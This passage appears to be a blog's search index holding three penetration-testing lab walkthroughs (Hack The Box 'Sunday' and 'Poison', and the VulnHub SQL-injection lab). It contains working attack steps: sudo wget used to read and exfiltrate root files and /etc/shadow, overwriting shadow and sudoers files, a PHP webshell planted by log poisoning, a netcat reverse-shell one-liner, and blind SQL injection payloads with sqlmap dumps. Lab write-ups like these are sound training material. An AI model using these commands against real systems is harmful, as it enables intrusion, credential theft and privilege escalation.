box: root@SittingDucks:~# nc -lvnp 9999 listening on [any] 9999 ... connect to [10.10.14.46] from (UNKNOWN) [10.10.10.76] 56164 root@sunday:~# id uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon) Achieving the above was not very easy. It turns out there is a script resetting troll back again to its original state every 5 seconds. I only managed that as I was fast and I got the tip from IPPSEC. 2. Read the root.txt with wget options I admit at this stage I was stuck for more than I expected. I am quite sure being a an old Solaris box there will be vulnerabilities to exploit althouth I did not manage to do it and wasted quite some time. However, researching online I found out that we could use the wget command to simply read file by using the --input-file ( -i ) option. So since sammy can run wget as root we can use it to read any file we want. Let's try to read root.txt sammy@sunday:~$ sudo wget -i /root/root.txt /root/root.txt: Invalid URL fb????????????????????????????b8: Unsupported scheme No URLs found in /root/root.txt. Although I get an error because there were no URL found, I am still able to see the content of root.txt. Very simple and effective! Another way to read the root.txt file is by using the --post-file option: sammy@sunday:~$ sudo wget --post-file = /root/root.txt 10 .10.14.46:1234 --10:20:52-- http://10.10.14.46:1234/ => `index.html' Connecting to 10.10.14.46:1234... connected. HTTP request sent, awaiting response... and on my kali box, where I had opened a netcan session started we can see the hash: root@SittingDucks:~# nc -lvnp 1234 listening on [any] 1234 ... connect to [10.10.14.46] from (UNKNOWN) [10.10.10.76] 44131 POST / HTTP/1.0 User-Agent: Wget/1.10.2 Accept: */* Host: 10.10.14.46:1234 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 33 fb????????????????????????????b8 3. Modify the /etc/shadow Using the same concept we can read the /etc/shadow and get the root password hash. Then we can try to crack it as we did previously. sammy@sunday:~$ sudo wget -i /etc/shadow /etc/shadow: Invalid URL root:$5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD:14146::::::: Unsupported scheme /etc/shadow: Invalid URL daemon:NP:6445::::::: Unsupported scheme /etc/shadow: Invalid URL bin:NP:6445::::::: Unsupported scheme /etc/shadow: Invalid URL sys:NP:6445::::::: Unsupported scheme /etc/shadow: Invalid URL adm:NP:6445::::::: Unsupported scheme /etc/shadow: Invalid URL lp:NP:6445::::::: Unsupported scheme /etc/shadow: Invalid URL uucp:NP:6445::::::: Unsupported scheme /etc/shadow: Invalid URL nuucp:NP:6445::::::: Unsupported scheme /etc/shadow: Invalid URL dladm:*LK*:::::::: Unsupported scheme /etc/shadow: Invalid URL smmsp:NP:6445::::::: Unsupported scheme /etc/shadow: Invalid URL listen:*LK*:::::::: Unsupported scheme /etc/shadow: Invalid URL gdm:*LK*:::::::: Unsupported scheme /etc/shadow: Invalid URL zfssnap:NP:::::::: Unsupported scheme /etc/shadow: Invalid URL xvm:*LK*:6445::::::: Unsupported scheme /etc/shadow: Invalid URL mysql:NP:::::::: Unsupported scheme /etc/shadow: Invalid URL openldap:*LK*:::::::: Unsupported scheme /etc/shadow: Invalid URL webservd:*LK*:::::::: Unsupported scheme /etc/shadow: Invalid URL postgres:NP:::::::: Unsupported scheme /etc/shadow: Invalid URL svctag:*LK*:6445::::::: Unsupported scheme /etc/shadow: Invalid URL nobody:*LK*:6445::::::: Unsupported scheme /etc/shadow: Invalid URL noaccess:*LK*:6445::::::: Unsupported scheme /etc/shadow: Invalid URL nobody4:*LK*:6445::::::: Unsupported scheme /etc/shadow: Invalid URL sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::: Unsupported scheme /etc/shadow: Invalid URL sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::: Unsupported scheme No URLs found in /etc/shadow. As I did per sammy, similarly I could apply the same procedure for root to crack the hash but there is a simpler way and less time consuming way. We can simply change the hash of root and replace it with something else, for instance with sammy's hash. Let's try that I copy sunday /etc/shadow content on my kali box and I replace the root hash with sammy's as follows: root:$5$Ebkn8jlK$ i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:14146:::::: daemon:NP:6445:::::: bin:NP:6445:::::: sys:NP:6445:::::: adm:NP:6445:::::: lp:NP:6445:::::: uucp:NP:6445:::::: nuucp:NP:6445:::::: dladm:*LK*::::::: smmsp:NP:6445:::::: listen:*LK*::::::: gdm:*LK*::::::: zfssnap:NP::::::: xvm:*LK*:6445:::::: mysql:NP::::::: openldap:*LK*::::::: webservd:*LK*::::::: postgres:NP::::::: svctag:*LK*:6445:::::: nobody:*LK*:6445:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: sammy:$5$Ebkn8jlK$ i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: sunny:$5$iRMbpnBv$ Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636:::::: Then I start an http server with python on my kali box root@SittingDucks:/home/user/Documents/htb/boxes/sunday# python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... and then I use wget to download the file and overwrite the existing /etc/shadow (using the -O option to overwrite it). sammy@sunday:~# sudo wget 10 .10.14.46:8000/shadow -O /etc/shadow --10:10:20-- http://10.10.14.46:8000/shadow => `/etc/shadow' Connecting to 10.10.14.46:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 634 [application/octet-stream] 100%[==================================================================================================================>] 634 --.--K/s 10:10:20 (60.28 MB/s) - `/etc/shadow' saved [634/634] then we can switch to the root user providing sammy's password (cooldude!) and we are in! sammy@sunday:~$ su - Password: Sun Microsystems Inc. SunOS 5.11 snv_111b November 2008 You have new mail. root@sunday:~# id uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon) root@sunday:~# 4. Modify the /etc/sudoers based on the info we gathered for both sunny and sunday, the sudoers file in the box should contain at least this: root ALL=(ALL) ALL sammy ALL=(root) NOPASSWD: /usr/bin/wget sunny ALL=(root) NOPASSWD: /root/troll so i can tamper this file with the same procedure used on point 2. and have this instead: root ALL=(ALL) ALL sammy ALL=(root) NOPASSWD: /usr/bin/su sunny ALL=(root) NOPASSWD: /root/troll I have replaced wget with su . Then I open a simple python http server and download and overwrite the sudoers file with wget sammy@sunday:~$ sudo wget 10 .10.14.46:8000/sudoers -O /etc/sudoers --19:07:07-- http://10.10.14.46:8000/sudoers => `/etc/sudoers' Connecting to 10.10.14.46:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 98 [application/octet-stream] 100%[==================================================================================================================>] 98 --.--K/s 19:07:07 (22.31 MB/s) - `/etc/sudoers' saved [98/98] sammy@sunday:~$ sudo -l User sammy may run the following commands on this host: (root) NOPASSWD: /usr/bin/su Once this is done I can simply become root as follow: sammy@sunday:~$ sudo su root@sunday:~# id uid=0(root) gid=0(root) 5. leveraging pfexec Lastly I found another method which is interesting. I know Linux and I know that Solaris is another unix system hence has a lot of similarities with Linux. However, I didn't know a particular Solaris command, pfexec . pfexec provides a RBAC (Role Based Access Control) mechanism and is basicaly the passwordless version of sudo. More info are available at the official oracle website . sammy@sunday:~$ cat /etc/user_attr # # Copyright 2008 Sun Microsystems, Inc. All rights reserved. # Use is subject to license terms. # # CDDL HEADER START # # The contents of this file are subject to the terms of the # Common Development and Distribution License ( the \"License\" ) . # You may not use this file except in compliance with the License. # # You can obtain a copy of the license at usr/src/OPENSOLARIS.LICENSE # See the License for the specific language governing permissions # and limitations under the License. # # When distributing Covered Code, include this CDDL HEADER in each # file and include the License file at usr/src/OPENSOLARIS.LICENSE. # If applicable, add the following below this CDDL HEADER, with the # fields enclosed by brackets \"[]\" replaced with your own identifying # # CDDL HEADER END # # /etc/user_attr # # user attributes. see user_attr ( 4 ) # # adm::::profiles=Log Management dladm::::auths=solaris.smf.manage.wpa,solaris.smf.modify lp::::profiles=Printer Management postgres::::type=role;profiles=Postgres Administration,All root::::type=role;auths=solaris.*,solaris.grant;profiles=All;lock_after_retries=no;min_label=admin_low;clearance=admin_high zfssnap::::type=role;auths=solaris.smf.manage.zfs-auto-snapshot;profiles=ZFS File System Management sammy::::profiles=Primary Administrator;roles=root Looking at the /etc/user_attr file (similar to the sudoers file in linux) we notice that sammy is listed there and has been given root role. So we can simply run anything we want using sammy and the pfexec command. For example we can run the following to get root.txt output sammy@sunday:~$ pfexec cat /root/root.txt fb????????????????????????????b8 or we can just run the below to get a bash shell as root: sammy@sunday:~$ pfexec bash sammy@sunday:~# id uid=0(root) gid=0(root) groups=10(staff)","tags":"blogging","loc":"https://sittingducks.io/Sunday.html","title":"Sunday"},{"url":"https://sittingducks.io/Poison.html","text":"Local File Inclusion (LFI) is a type of vulnerability usually found in poorly written PHP code. In particular, misconfigurations of some php.ini values such as the allow_url directives, may allow an attacker to include a local or even remote file (Remote File Inclusion - RFI) into the webserver running the PHP code. The main difference between LFI and RFI is that the former allows an attacker to only include files already present in the webserver, whereas the latter allows an attacker to introduce his own code. To demonstrate LFI I will use a machine dubbed Poison which I found on hackthebox.eu . Recons First thing first. I did a port scan with nmap and found the following open ports: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0) | ssh-hostkey: | 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA) | 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA) |_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519) 80/tcp open ssl/http Apache/2.4.29 (FreeBSD) PHP/5.6.32 |_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32 |_http-title: Site doesn't have a title (text/html; charset=UTF-8). Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd We can see that we have ssh and http ports opened. We can also see the verions of openssh and PHP, and that the OS is FreeBSD. Now it's time to scan the webserver with gobuster: m4rc0@SittingDucks:~$ gobuster dir -u http://10.10.10.84 -w Documents/htb/SecLists/Discovery/Web-Content/common.txt -t 100 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.84 [+] Threads: 100 [+] Wordlist: Documents/htb/SecLists/Discovery/Web-Content/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/11/27 06:39:57 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.php (Status: 200) /info.php (Status: 200) /phpinfo.php (Status: 200) =============================================================== 2019/11/27 06:40:04 Finished =============================================================== We have three interesting pages we can check: index,php, info.php, phpinfo.php. The phpinfo.php page usually reports useful info. In this context, we can use it to check the value of the allow_url directives before mentioned. From the above screenshot we can deduct that the allow_url_fopen directive is on whereas the allow_url_include is off. From the PHP documentation we can see the following description about the directives: allow_url_fopen boolean \"This option enables the URL-aware fopen wrappers that enable accessing URL object like files. Default wrappers are provided for the access of remote files using the ftp or http protocol, some extensions like zlib may register additional wrappers\" allow_url_include boolean \"This option allows the use of URL-aware fopen wrappers with the following functions: include, include_once, require, require_once\" In these conditions the webserver will be only vulnerable to LFI (allow_url_fopen=on), whereas we won't be able to exploit an RFI since the allow_url_include is off. To give a more pratical example, let us say we have a webserver at example.com and it allows LFI, then we will have something similar: http://example.com/?page=index.php then to exploit this LFI we would need to somehow be able to put another local file instead of index.php in the URL above. We will see this later more in details. For RFI, instead, we would need to do something similar to this: http://example.com/?page=http://attacker.example.com/evil.php So we would embed a URL within another URL, but since allow_url_include is off we will be unable to do that. The latter directive has been set off by default from PHP version 5.2.0. Now, let us visit the index.php page of the webserver running in the Poison virtual machine. Ideally you would need to test all the scripts but my focus is to explain LFI so let's just try info.php. Once I insert info.php in the scritpname box I get this: Apart from the useful OS version information the other interesting bit is the URL. In fact, we are in the situation I explained above with example.com. We have: http://10.10.10.84/browse.php?file=info.php LFI usually allows for path traversal, that is it's possible to insert a malicious string as the variable parameter to access files located outside the web publish directory. in the example above I added the string \"/etc/passwd\" in the variable parameter and I am able to see the content of the passwd file of the FreeBSD machine the webserver is running on. We have basically exploited LFI and obtained valuable information of the machine in question. We can do the same to enumerate other potentially useful files contained in the server. It's important to note the two users marked in red, root and charix. These are the only users that have a shell (/bin/csh) so they are the ones we can potentially use later on to try and get access. Additionally to verify that RFI doesn't work we can do he following: In fact we get an error message stating that the http wrapper is disable. I also tried other wrappes such as ftp and I got the same result. Now, if we could insert code, for instance a webshell, into a local file present in the machine? With RFI would have been very easy to just pass the URL of where our webshell resides and that's it! In this case it's a bit trickier but not impossible, just requires few more steps. The idea is to poison (hence the machine was dubbed Poison) some log files, that is insert some code in there and then run the code. Basically transforming the LFI into an RCE (Remote Code Execution). Let us try to inject this simple php code <?php system($_GET['cmd']); ?> So I enable the proxy on the browser and then I open burpsuite to capture the request before it gets to the webserver. Then I paste the above php code in the user agent section in place of the string in red below: Here the pasted code: Then I send the request to the Repeater in burp and do the following: Basically the php code <?php system($_GET['cmd']); ?> instructs the system that anything coming after \"cmd\" is a command, so when I appended &cmd=id to the URL the id command gets executed and shows the result in the logs. We have basically created an RCE which allow us to execute code in the webserver. That being said, we can try to run other more complex commands in order to get a reverse shell. In this specific scenario, this is a little bit tricky because we are dealing with a version of FreeBSD, which by default does not have bash, python, perl, etc. I have already tried a reverse shell by using netcat but looks like the version of netcat in the target machine does not support the -e option. So now we will try something different and we will replace the id command with the following string as noted on pentestmonkey : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f However, when I sent this request I got an \"400 Bad Request\" error message. Looks like the webserver did not understand the request so something wrong with the string itself. After doing some research I found out that we can send the same request URL-encoded and that would help avoiding some issues with chars set. Burp can do that by default so we just need to select the string we want to encode, then right click and choose Convert Selection --> URL --> URL Encode All Characters. Now before sending this request I will set a netcat listener on port 9999 on my kali machine. Once I send the request I will receive a shell back as depicted below: From the whoami command we can see we are the www user. We got a working shell but I am still unable to get an interactive tty shell most probably because the www user does not have a shell as we can see if the /etc/passwd screenshot above (/usr/sbin/nologin). However, let us see what we can do without a tty. NOTE: all the above steps could have been avoided. As we are in the /usr/local/www/apache24/data directory, we could have accessed this informatioon via browser and get this information like we did for the passwd file (exploiting LFI) without the need to get a shell. However, I wanted to show how easy it is to move from LFI to RCE. With a list command we can see some files. Particularly interesting is the pwdbackup.txt . When catting the file we can see \"This password is secure, it's encoded atleat 13 times...\". By the look, it seems a base64 encoding so we can try to decode it with a simple python script: import base64 a ='Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=' for x in xrange(13): a= base64.b64decode(a) print(a) By running this script I obtain the string Charix!2#4%6&8(0 which could be the password for the user charix we noticed before. So let's try to ssh to the box with it. In fact, I was able to ssh with the user charix. I also found the user.txt that contains the hash I can submit to htb to prove I owned the user. There is also another interesting file, secret.zip, which seems password protected. When trying to unzipping the file it did not prompt for a password so I tried to unzip it with the -P option and providing the password we found earlier but I got an error as noticable from the screenshot. So I downloaded the file to my kali machine and to do that I have ran a python command which starts a simple http server running on port 1111 on the victim machine. This way I can use wget on my kali box to download the file as shown in the screenshot above. Once I have the file in my box when I tried to unzip it, it asked for the password and I providing the paswword we used for the user charix worked fine and I have an encoded secret file unzipped. At this stage we should find a way to escalate privileges to the root user. To do that I decided to download (using the SimpleHTTPServer method) and run a nice script called LinEnum in the victim machine. The script will gather a good amount of useful information for us to analyse and try to spot a weakness that leads us to root the box. Among many other useful info, LinEnum prints out also the running processes. We can see there is a VNC process running as root which is unusual and we could potentially use it to get root access. By running a nestat to check the listening ports we can see the following: Ports 5801 and 5901 are vnc ports therefore we have confirmation that vnc is running and listening. Unfortunately we don't have a vnc client (vncviewer) in the box so we can't try to vnc locally without it. If I try to connect to it remotely I have the below result but this is expected because from the netstat output we could see the vnc server is listening on the localhost (127.0.0.1). To work-around this issue we can create an ssh tunnel with the following command: m4rc0@SittingDucks:~$ ssh -L 1234 :127.0.0.1:5901 charix@10.10.10.84 Password for charix@Poison: Last login: Fri Dec 6 08:02:00 2019 from 10.10.14.46 FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017 Welcome to FreeBSD! Release Notes, Errata: https://www.FreeBSD.org/releases/ Security Advisories: https://www.FreeBSD.org/security/ FreeBSD Handbook: https://www.FreeBSD.org/handbook/ FreeBSD FAQ: https://www.FreeBSD.org/faq/ Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/ FreeBSD Forums: https://forums.FreeBSD.org/ Documents installed with the system are in the /usr/local/share/doc/freebsd/ directory, or can be installed later with: pkg install en-freebsd-doc For other languages, replace \"en\" with a language code like de or fr. Show the version of FreeBSD installed: freebsd-version ; uname -a Please include that output and any error messages when posting questions. Introduction to manual pages: man man FreeBSD directory layout: man hier Edit /etc/motd to change this login announcement. You can use the 'fetch' command to retrieve files over ftp, http or https. fetch http://www.FreeBSD.org/index.html will download the front page of the FreeBSD web site. We can see in my kali box that the we have a listening connection on the localhost at port 1234. So we can then connect to that socket using vncviewer:","tags":"blogging","loc":"https://sittingducks.io/Poison.html","title":"Poison"},{"url":"https://sittingducks.io/From-SQL-Injection-to-Shell-II.html","text":"While practising on the blind SQL injections topic I came across this vulnhub lab which I have found particularly interesting. The lab was created in 2013 but it is still very relevant for learning and testing your skills. As explained in the description, there are two main objectives for this lab: gaining administrative access to the victim machine obtaining a remote shell to for code execution Since there are already three good walkthrough articles that cover this topic I am only going to focus on the the first objective with the aim to provide a different approach. Blind SQL injections are not easy to spot, therefore my aim is to facilitate and speed up the identification process avoiding manual steps. The other articles and especially this one provides a more comprehensive approach which digs deeper and uses more manual steps. I strongly suggest to have a read if you want to understand the mechanism behind this blind SQL injection. As the second objective has already been covered in the other articles and I want to avoid being redundant I will skip it. Walkthrough After downloading and deploying the ISO of the VM, we need to find out the IP address of our victim machine . From my attacker host (I am using Parrot OS ), knowing i am in the 192.168.4.1-254 range, I launch a ping sweep as follow: ┌─[root@SittingDucks]─[~] └──╼ #nmap -sn 192.168.4.1-254 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-25 21:42 BST Nmap scan report for 192.168.4.1 Host is up (0.00073s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 192.168.4.2 Host is up (0.00025s latency). MAC Address: 00:50:56:E8:17:CC (VMware) Nmap scan report for 192.168.4.129 Host is up (0.0013s latency). MAC Address: 00:0C:29:EE:D8:8B (VMware) Nmap scan report for 192.168.4.254 Host is up (0.00037s latency). MAC Address: 00:50:56:E2:6E:46 (VMware) Nmap scan report for 192.168.4.130 Host is up. Nmap done: 254 IP addresses (5 hosts up) scanned in 2.43 seconds I notice a new IP address, 192.168.4.129, which is my new victim machine so now I launch a targeted scan to gather more information. ┌─[root@SittingDucks]─[~] └──╼ #nmap -A 192.168.4.129 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-25 21:46 BST Nmap scan report for 192.168.4.129 Host is up (0.0012s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http nginx 0.7.67 |_http-server-header: nginx/0.7.67 |_http-title: My Photoblog - latest picture MAC Address: 00:0C:29:EE:D8:8B (VMware) Device type: general purpose Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6.32 OS details: Linux 2.6.32 Network Distance: 1 hop TRACEROUTE HOP RTT ADDRESS 1 1.25 ms 192.168.4.129 OS and Service detection performed. Please report any incorcd rect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds From the output I learn that the there is an nginx 0.7.67 webserver running on the default port 80 on the victim machine and that the website title is \"My Photoblog\". I decide to explore the website and I move to the \"test\" page: I notice that the URL changes to http://192.168.4.129/cat.php?id=1 so I deduct I am dealing with a php web application and we can immediately test the id parameter to check if it is injectable. Simply adding the apostrophe symbol at the end of the URL http://192.168.4.129/cat.php?id=1' does not produce any results, meaning the parameter has been sanitised and is not injectable. Sqlmap is a great tool which we can use it to scan websites for SQL injections. I have tried to scan the website in question with sqlmap but I was unsuccessful: [root@SittingDucks]─[~] └──╼ #sqlmap -u http://192.168.4.129/ --batch --crawl=10 but I got this result: [20:31:19] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') then I increased the values for '--level'/'--risk' options: [root@SittingDucks]─[~] └──╼ #sqlmap -u http://192.168.4.129/ --batch --crawl=10 --level=5 --risk=3 and I got this: [22:37:38] [ERROR] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next form so I even added several tamper scripts with same results. At that point I stopped and I decided to go back doing more research. This is what I found from sqlmap github page : \"By default sqlmap tests all GET parameters and POST parameters. When the value of --level is >= 2 it tests also HTTP Cookie header values. When this value is >= 3 it tests also HTTP User-Agent and HTTP Referer header value for SQL injections. It is however possible to manually specify a comma-separated list of parameter(s) that you want sqlmap to test. This will bypass the dependence on value of --level too.\" and also this regarding extra HTTP Headers: \"It is possible to provide extra HTTP headers by setting the option --headers.\" So what if the blind vulnerability is hidden behind an extra (non-standard) HTTP header that sqlmap does not scan by default? And if this is the case, how can I know which one is the header in question given that there are so many out there? After some other research I found another interesting tool, Blisqy . So I decided to give it a try. I downloaded the tool which consists of python scripts: ┌─[m4rc0@SittingDucks]─[~/MyTools/Blisqy] └──╼ $ll total 16K -rwxr-xr-x 1 root root 683 May 25 15:55 ExploitBlindSpot.py -rwxr-xr-x 1 root root 800 May 25 15:58 FindBlindSpot.py drwxr-xr-x 1 root root 30 May 25 15:55 fuzz-data drwxr-xr-x 1 root root 106 May 25 15:59 fuzz-reports drwxr-xr-x 1 root root 134 May 25 20:07 lib -rw-r--r-- 1 root root 7.6K May 25 15:55 README.md To make it work, all I had to do is edit the the FindBlindSpot.py and add my target details: # Target Parameters Server = '192.168.4.129' Port = 80 Index = 1 Method = 'GET' After running the script I get this result: ┌─[root@SittingDucks]─[/home/m4rc0/MyTools/Blisqy] └──╼ #./FindBlindSpot.py [+] Fuzzer Running : 192.168.4.129:80 [+] Base Index Record for Target : 0.0 ============== Furzzzn =============== <snip> ==============[ LUCKY! ]===================== [!] Found some +ve Results Check Fuzz Report for Details [+] Injection : X-Forwarded-For : 'XOR(if(now()=sysdate(),sleep(5),0))OR' [+] Header : X-Forwarded-For [*] Index Record : 0.000646114349365 [*] Benching Record : 5.00064611435 [*] Fuzzing Record : 10.01 [!] Test 469 is Injectable. ------ [+] Injection : X-Forwarded-For : ' or sleep(5)# [+] Header : X-Forwarded-For [*] Index Record : 0.00129318237305 [*] Benching Record : 5.00129318237 [*] Fuzzing Record : 25.01 [!] Test 473 is Injectable. ------ [+] Injection : X-Forwarded-For : ' or sleep(5)=' [+] Header : X-Forwarded-For [*] Index Record : 0.00204205513 [*] Benching Record : 5.00204205513 [*] Fuzzing Record : 60.01 [!] Test 475 is Injectable. <snip> As suspected, a non-standard header was found vulnerable to SQL injection. The header in question is X-Forwarded-For , which is typically used for identifying the originating IP address of a client that connects to a web server through a proxy. With this knowledge I can now go back to sqlmap and perform a targeted scan using the X-Forwarded-For header as follow: [root@SittingDucks]─[~] └──╼ #sqlmap -u http://192.168.4.129/ --batch --headers=\"X-Forwarded-For:*\" ..... [10:49:55] [INFO] (custom) HEADER parameter 'X-Forwarded-For # 1 * ' appears to be ' MySQL > = 5 .0.12 AND time-based blind ' injectable ..... sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests: Parameter: X-Forwarded-For #1* ((custom) HEADER) Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind Payload: ' AND SLEEP(5) AND 'sYsD'='sYsD [10:50:11] [INFO] the back-end DBMS is MySQL web application technology: PHP 5.3.3, Nginx 0.7.67 back-end DBMS: MySQL >= 5.0.12 [10:50:11] [INFO] fetching database names [10:50:11] [INFO] fetching number of databases [10:50:11] [INFO] resumed: 2 [10:50:11] [INFO] resumed: information_schema [10:50:11] [INFO] resumed: photoblog available databases [2]: [*] information_schema [*] photoblog [10:50:11] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.4.129' [*] ending @ 10:50:11 /2019-05-27/ Since the name of the website is \"My Awesome Photoblog\" I can easily guess that the name of the database is photoblog and therefore I will dump all its content using the following command: ┌─[root@SittingDucks]─[~] └──╼ #sqlmap -u http://192.168.4.129 --headers=\"X-Forwarded-For:*\" -D photoblog --dump-all --batch This is an excerpt of the result which contains very valuable information: Database: photoblog Table: users [1 entry] +----+-------+---------------------------------------------+ | id | login | password | +----+-------+---------------------------------------------+ | 1 | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) | +----+-------+---------------------------------------------+ The photoblog database contains, indeed, a table \"users\" with a login user name called \"admin\" and a password \"P4ssw0rd\". Looking back at the website there is an administration login page: and if i try to login using the credentials mentioned above I succeed: I have now gained administrative access to the website which was part of the objectives of this exercise. As mentioned above please refer to one of these articles for the second objective: 16 Jan 2017 - Hack the Pentester Lab: from SQL injection to Shell II (Blind SQL Injection) ( Raj Chandel ) 19 Nov 2016 - From SQL Injection to Shell 2:Walkthough ( Rakesh Singh ) 12 Jun 2013 - From SQL injection to Shell II ( Pentester Lab )","tags":"blogging","loc":"https://sittingducks.io/From-SQL-Injection-to-Shell-II.html","title":"From SQL Injection to Shell II"}]};